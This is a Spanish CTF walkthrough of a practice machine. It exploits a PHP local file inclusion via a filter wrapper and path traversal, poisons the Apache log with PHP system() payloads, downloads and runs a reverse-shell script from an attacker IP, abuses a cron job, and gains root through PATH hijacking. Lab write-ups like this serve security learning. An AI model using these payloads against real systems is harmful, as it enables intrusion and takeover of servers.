Hacemos el reconocimiento con nmap:
![[Pasted image 20230624104909.png]]
Vemos que tiene abierto el puerto 80, por lo que miramos qué web está corriendo:
![[Pasted image 20230624104939.png]]
Hacemos fuzzing a la web pero nos encontramos con un rabbit hole, en el directorio flags:
![[Pasted image 20230624105449.png]]
![[Pasted image 20230624105503.png]]
![[Pasted image 20230624105511.png]]
No obstante, vemos el dominio de mafialive.thm:
![[Pasted image 20230624105631.png]]
Por lo que lo añadimos en el /etc/hosts, accedemos a http://mafialive.th y nos encontramos con la primera flag:
![[Pasted image 20230624105723.png]]
Ahora debemos buscar alguna página en mantenimiento dentro de esta, por lo que podemos hacer fuzzing con gobuster buscando extensiones de archivos, por ejemplo de php:
![[Pasted image 20230624110844.png]]
Accedemos a este /test.php:
![[Pasted image 20230624110910.png]]
Y nos encontramos con un local file inclusion donde el parámetro view parece ser vulnerable:
![[Pasted image 20230624111028.png]]
Si intentamos hacer un local file inclusion vemos que no tenemos permisos, por lo que hay algo que nos lo impide:
![[Pasted image 20230706193131.png]]
Por tanto tenemos que recurrir a los wrapper [[Wrapper - Ejecución Remota de Comandos en LFI]] en este repositorio de payloads all the things:
```bash
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
```
![[Pasted image 20230625155136.png]]
Y aquí tenemos unas instrucciones, por ejemplo con el wrapper filter:
![[Pasted image 20230625155527.png]]
Por tanto este es el wrapper del ejemplo:
```python
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
Y este sería el wrapper en nuestra url basándonos en el del ejemplo:
```python
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
Y nos devuelve un texto codificado en base64:
![[Pasted image 20230624113043.png]]
El texto es este:
```bash
CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== 
```
Por lo que podemos decodificarlo en base64 y obtenemos la siguiente flag:
![[Pasted image 20230625155944.png]]
Y ahora de alguna forma si intentamos hacer un local file inclusion, ya vamos a poder:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../././etc/passwd
```
![[Pasted image 20230625161706.png]]
Llegados a este punto, también podemos leer archivos de logs probando con esta otra ruta:
```python
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../././var/log/apache2/access.log
```
![[Pasted image 20230625161757.png]]
Por tanto, una vez visto esto, podemos intentar hacer un log poisoning, de tal forma que si probamos en ejecutar una petición con curl podemos inyectar texto dentro del apartado del user agent:
```bash
curl -s -X GET 'http://mafialive.thm' -H 'User-Agent:Pruebas'
```
![[Pasted image 20230706193634.png]]
Pero ahora si dentro del user-agent inyectamos un código php malicioso para ejecutar comandos, veremos que funciona:
```bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('whoami'); ?>"
```
![[Pasted image 20230706193823.png]]
Una vez hecho esto, montamos un servidor http con python y nos compartimos un fichero para enviarnos una reverse shell:
![[Pasted image 20230706195814.png]]
![[Pasted image 20230706195824.png]]
Y entonces ahora ejecutamos el comando wget para obtener este archivo y después bash pwned.sh para ejecutarlo y recibir la reverse shell:
```bash
curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('wget http://10.8.100.91/pwned.sh'); ?>"

curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('chmod 777 pwned.sh'); ?>"

curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('bash pwned.sh'); ?>"
```
Una vez ejecutado lo anterior, refrescamos y habremos recibido la reverse shell:
![[Pasted image 20230706200246.png]]
Y habremos recibido la reverse shell:
![[Pasted image 20230706200000.png]]
Una vez dentro, tras hacer una serie de comprobaciones, vemos que hay una tarea crontab que ejecuta un helloworld.sh:
![[Pasted image 20230625164640.png]]
Por tanto vamos a editar este fichero y ponemos el código para enviarnos una reverse shell como archangel pero esta vez por el puerto 444:
![[Pasted image 20230625165004.png]]
Lo guardamos y ya hemos recibido la shell reversa como el usuario archangel:
![[Pasted image 20230625165056.png]]
Una vez en este punto, si hacemos una búsqueda de binarios, nos encontramos con /home/archangel/secret/backup:
![[Pasted image 20230625165351.png]]
Tras visualizar este archivo, nos encontramos que entre tanto texto, se realiza una copia de archivos donde se está usando el comando cp como root:
![[Pasted image 20230625165552.png]]
Por lo que podemos manipular el path y añadir un /bin/bash dentro de cp, para posteriormente añadirlo al PATH y lanzarnos como root una bash:
```bash
echo '/bin/bash' > cp

chmod 777 cp

export PATH=.:$PATH

/home/archangel/secret/backup
```
Y con esto ya nos convertimos en root:
![[Pasted image 20230625165928.png]]
